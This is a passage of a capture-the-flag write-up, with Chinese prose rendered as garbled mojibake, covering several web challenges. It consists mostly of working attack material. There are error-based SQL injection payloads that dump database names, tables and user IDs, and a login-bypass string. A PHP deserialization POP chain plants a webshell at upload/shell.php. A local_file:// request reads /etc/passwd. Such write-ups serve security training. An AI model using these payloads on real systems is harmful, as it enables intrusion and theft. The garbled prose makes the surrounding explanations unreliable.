<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="n">sql_injection</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x73716C5F696E6A656374696F6E</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="n">users</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="k">USER</span><span class="p">,</span><span class="n">CURRENT_CONNECTIONS</span><span class="p">,</span><span class="n">TOTAL_CONNECTIONS</span><span class="p">,</span><span class="k">user</span><span class="p">,</span><span class="n">uniqueid</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="n">uniqueid</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="mi">2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">uniqueid</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="mi">837461526918364526</span><span class="p">,</span><span class="mi">123456789928466788</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…ç”¨ä¸‡èƒ½å¯†ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 || 1=1 limit 0,1
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="å®‰æ´µæ¯-2019ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ">[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ 
</h2><p>å…ˆç”¨æºç çš„ååºåˆ—åŒ–</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">helper</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$ifview</span> <span class="o">=</span> <span class="k">True</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$config</span> <span class="o">=</span> <span class="s2">&#34;/flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">helper</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:6:&#34;helper&#34;:2:{s:9:&#34;*ifview&#34;;b:1;s:9:&#34;*config&#34;;s:5:&#34;/flag&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å› ä¸ºéƒ½æ˜¯protectedå±æ€§çš„ï¼Œç”¨<code>\0\0\0</code>æ›¿æ¢ï¼ˆæºç ç»™çš„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$key_temp</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;*&#39;</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s1">&#39;\0\0\0&#39;</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value_temp</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;*&#39;</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s1">&#39;\0\0\0&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:6:&#34;helper&#34;:2:{s:9:&#34;\0\0\0ifview&#34;;b:1;s:9:&#34;\0\0\0config&#34;;s:5:&#34;/flag&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæºç æœ‰è¿™ä¸€è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;INSERT INTO images (&#34;</span><span class="o">.</span><span class="p">(</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span><span class="nv">$sql_fields</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;) VALUES(&#34;</span><span class="o">.</span><span class="p">(</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span><span class="nv">$sql_val</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;)&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹è¿”å›å€¼titileå¯æ§</p>
<p>æ‹¼æ¥ç„¶å16è¿›åˆ¶ç»•è¿‡åŒå¼•å·waf</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åä¿®æ”¹æ–‡ä»¶å</p>
<p>è®¿é—®show.phpè§¦å‘ååºåˆ—åŒ–</p>
<h2 id="å¼ºç½‘æ¯-2019upload">[å¼ºç½‘æ¯ 2019]Upload
</h2><p>ç›®å½•æ‰«æwww.tar.gz</p>
<p>thinkphp5</p>
<p>profile.phpä¸‹é¢æœ‰ä¸¤ä¸ªé­”æœ¯æ–¹æ³•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">except</span><span class="p">[</span><span class="nv">$name</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arguments</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$name</span><span class="p">}){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$name</span><span class="p">}}(</span><span class="nv">$arguments</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>register.phpé‡Œé¢ä¹Ÿæœ‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registed</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checker</span><span class="o">-&gt;</span><span class="na">index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Profileèµ‹å€¼checkerï¼Œè§¦å‘callï¼Œç„¶åagrumentä¸ºç©º,è§¦å‘getï¼Œç„¶åexceptå¯æ§
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå›æ¥çœ‹ä¸Šä¼ çš„é€»è¾‘</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename_tmp</span><span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;.png&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ext_check</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ext</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename_tmp</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">copy</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename_tmp</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename_tmp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">img</span><span class="o">=</span><span class="s2">&#34;../upload/</span><span class="si">$this-&gt;upload_menu</span><span class="s2">/</span><span class="si">$this-&gt;filename</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">update_img</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">update_img</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user_info</span><span class="o">=</span><span class="nx">db</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s2">&#34;ID&#34;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checker</span><span class="o">-&gt;</span><span class="na">profile</span><span class="p">[</span><span class="s1">&#39;ID&#39;</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">find</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$user_info</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">img</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">db</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;ID&#39;</span><span class="p">,</span><span class="nv">$user_info</span><span class="p">[</span><span class="s1">&#39;ID&#39;</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">([</span><span class="s2">&#34;img&#34;</span><span class="o">=&gt;</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">img</span><span class="p">)])</span><span class="o">-&gt;</span><span class="na">update</span><span class="p">()){</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">update_cookie</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">success</span><span class="p">(</span><span class="s1">&#39;Upload img successful!&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">(</span><span class="s1">&#39;../home&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="s1">&#39;Upload file failed!&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">(</span><span class="s1">&#39;../index&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>            
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬ä¸€æ¬¡ä¸Šä¼ å°±èƒ½ä½¿empty=1ï¼Œç»•è¿‡<code>.png</code>çš„æ‹¼æ¥</p>
<p>è¦ä½¿ext=1</p>
<p>index.phpé‡Œé¢ä¼šååºåˆ—åŒ–cookie</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">app\web\controller</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Register</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$checker</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$registed</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="c1">//ç›®çš„æ˜¯è¿‡destructé‡Œçš„if;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Profile</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$checker</span> <span class="o">=</span><span class="mi">0</span> <span class="p">;</span><span class="c1">//ç›®çš„æ˜¯ç»•è¿‡indexç±»çš„æ£€æŸ¥ï¼Œé˜²æ­¢é€€å‡ºç¨‹åº
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="nv">$filename_tmp</span><span class="o">=</span><span class="s2">&#34;./upload/9987df285bb375eda68448315c5656e5/4a47a0db6e60853dedfcfdf08a5ca249.png&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$upload_menu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s2">&#34;upload/shell.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$ext</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="c1">//ç›®çš„æ˜¯è¿‡ifæ¥è°ƒç”¨å¤åˆ¶webshell
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">public</span> <span class="nv">$img</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$except</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;index&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;upload_img&#34;</span><span class="p">);</span><span class="c1">//ç›®çš„æ˜¯é€šè¿‡__get()é­”æœ¯æ–¹æ³•è°ƒç”¨upload_Imgå‡½æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Register</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">checker</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Profile</span><span class="p">();</span><span class="c1">//ç›®çš„æ˜¯è°ƒç”¨POPé“¾
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">checker</span><span class="o">-&gt;</span><span class="na">checker</span><span class="o">=</span><span class="mi">0</span><span class="nx">ï¼›</span><span class="c1">//è°ƒç”¨popé“¾é˜²æ­¢é€€å‡ºç¨‹åº
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>cookieæ›¿æ¢å®Œè®¿é—®/upload/shell.php</p>
<h2 id="ciscn2019-åä¸œå—èµ›åŒºweb4">[CISCN2019 åä¸œå—èµ›åŒº]Web4
</h2><p>fileåè®®è¯»ä¸å‡ºæ¥ï¼ŒçŒœæµ‹pythonå†™çš„ç•Œé¢</p>
<p>åˆ©ç”¨<code>local_file://</code>åè®®è¯»æ–‡ä»¶ï¼Œæˆ–è€…ä»€ä¹ˆéƒ½ä¸ç”¨ç›´æ¥è¯»æ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/read?url=local_file:///etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¯»app.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">uuid</span><span class="o">,</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">getnode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">*</span><span class="mi">233</span><span class="p">)</span>
